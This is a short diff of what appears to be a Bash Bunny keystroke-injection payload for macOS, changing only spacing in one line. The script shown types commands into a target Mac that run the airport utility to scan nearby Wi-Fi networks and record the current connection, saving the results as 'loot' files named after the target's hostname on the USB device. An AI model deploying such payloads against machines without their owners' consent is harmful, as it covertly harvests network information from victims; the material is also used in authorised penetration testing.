@@ -20,7 +20,7 @@ QUACK DELAY 2000
 QUACK STRING "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport --scan --xml | tee /Volumes/BashBunny/Loot/${TARGET_HOSTNAME}-wifidiag.xml"
 QUACK ENTER
 QUACK DELAY 5000
-QUACK STRING "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I --xml| tee /Volumes/BashBunny/Loot/${TARGET_HOSTNAME}-wificurrent.xml"
+QUACK STRING "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I --xml | tee /Volumes/BashBunny/Loot/${TARGET_HOSTNAME}-wificurrent.xml"
 QUACK ENTER
 QUACK DELAY 1000
 QUACK STRING "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport --scan | tee /Volumes/BashBunny/Loot/${TARGET_HOSTNAME}-wifidiag.txt"
